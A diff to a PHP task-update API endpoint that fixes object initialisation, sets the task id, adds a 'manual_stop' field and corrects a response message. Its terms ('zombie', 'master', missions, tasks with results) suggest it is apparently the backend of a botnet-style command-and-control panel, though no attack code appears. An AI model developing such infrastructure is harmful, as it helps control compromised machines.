@@ -43,6 +43,9 @@ if($jwt){
         $database = new Database();
         $db = $database->getConnection();
 
+        // instantiate user object
+        $task = new Task($db);
+
         if (is_zombie($db, $requested_by)){
             $task->read_confirm = $data->read_confirm;
             $task->running = $data->running;
@@ -54,6 +57,7 @@ if($jwt){
             // this function raise exceptions in case of error (not requested by a master, or requesting changes on another master)
             check_master_permissions($requested_by);
             // set task to update property values
+            $task->id = $data->id;
             $task->mission_id = $data->mission_id;
             $task->task_type = $data->task_type;
             $task->task_content = $data->task_content;
@@ -65,15 +69,9 @@ if($jwt){
             $task->running = $data->running;
             $task->result = $data->result;
             $task->exec_at = $data->exec_at;
+            $task->manual_stop = $data->manual_stop;
         }
-
-
-        // this function raise exceptions in case of error (not requested by a master, or requesting changes on another master)
-        //check_master_permissions($requested_by, $to_update);
-
         
-        // instantiate user object
-        $task = new Task($db);
 
         // update the task record
         if($task->update()){
@@ -84,7 +82,7 @@ if($jwt){
             // response in json format
             echo json_encode(
                     array(
-                        "message" => "User was updated.",
+                        "message" => "Task was updated.",
                         "jwt" => $jwt
                     )
                 );
